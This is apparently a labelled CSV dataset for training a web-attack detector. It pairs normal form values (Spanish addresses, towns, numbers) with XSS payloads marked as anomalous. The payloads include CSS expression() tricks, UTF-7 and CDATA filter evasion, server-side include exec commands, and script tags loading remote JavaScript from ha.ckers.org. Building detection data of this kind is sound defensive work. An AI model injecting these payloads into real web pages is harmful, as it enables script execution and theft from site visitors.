payload,length,attack_type,label
c/ caridad s/n,14,norm,norm
"campello, el",12,norm,norm
40184,5,norm,norm
1.44243E+15,16,norm,norm
nue37,5,norm,norm
nuda drudes,11,norm,norm
tufts3@joll.rs,14,norm,norm
22997112x,9,norm,norm
"c/ del ferrocarril, 152,",24,norm,norm
arenas de san juan,18,norm,norm
19245,5,norm,norm
2.07077E+15,16,norm,norm
fennell,7,norm,norm
d50allecido,11,norm,norm
1902,4,norm,norm
genny,5,norm,norm
"<div style=""width: expression(alert('xss'));"">",46,xss,anom
"<img style=""xss:expr/*xss*/ession(alert('xss'))"">",49,xss,anom
"<xss style=""xss:expression(alert('xss'))"">",42,xss,anom
"exp/*<xss style='no\\xss:noxss(""*//*"");",38,xss,anom
"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>",83,xss,anom
"geturl(""javascript:alert('xss')"")",33,xss,anom
"a=""get"";",8,xss,anom
"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">",97,xss,anom
"<xml id=xss src=""http://ha.ckers.org/xsstest.xml"" id=i></xml>",61,xss,anom
"<script id=xss src=""http://ha.ckers.org/xss.jpg""></script>",58,xss,anom
"<!--#exec cmd=""/bin/echo '<script src'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></script>'""-->",110,xss,anom
<? echo('<scr)';,16,xss,anom
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-",127,xss,anom
"<script a="">"" id=xss src=""http://ha.ckers.org/xss.js""></script>",63,xss,anom
"<script a="">"" '' id=xss src=""http://ha.ckers.org/xss.js""></script>",66,xss,anom
"<script ""a='>'"" id=xss src=""http://ha.ckers.org/xss.js""></script>",65,xss,anom
"<script a=`>` id=xss src=""http://ha.ckers.org/xss.js""></script>",63,xss,anom
"<script>document.write(""<scri"");</script>pt id=xss src=""http://ha.ckers.org/xss.js""></script>",93,xss,anom
